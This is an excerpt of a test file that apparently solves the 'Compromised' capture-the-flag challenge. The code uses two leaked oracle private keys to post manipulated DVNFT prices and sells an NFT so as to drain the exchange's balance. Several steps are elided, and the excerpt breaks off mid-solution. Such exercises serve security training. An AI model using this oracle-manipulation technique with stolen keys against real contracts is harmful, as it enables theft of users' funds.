...
describe('Compromised challenge', function () {
    ...
    it('Exploit', async function () {
        ...
        let wallet1 = new ethers.Wallet(PRIVATEKEYONE, ethers.provider);
        let wallet2 = new ethers.Wallet(PRIVATEKEYTWO, ethers.provider);
        //change price to 0 and then buy 1
        ...
        //set NFT price back to high price
        const sellPrice = await ethers.provider.getBalance(this.exchange.address);
        await this.oracle.connect(wallet1).postPrice("DVNFT", sellPrice);
        await this.oracle.connect(wallet2).postPrice("DVNFT", sellPrice);

        //approve sell of NFT and sell it
        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
        await this.exchange.connect(attacker).sellOne(0);

        //update the price of the NFT to initial price
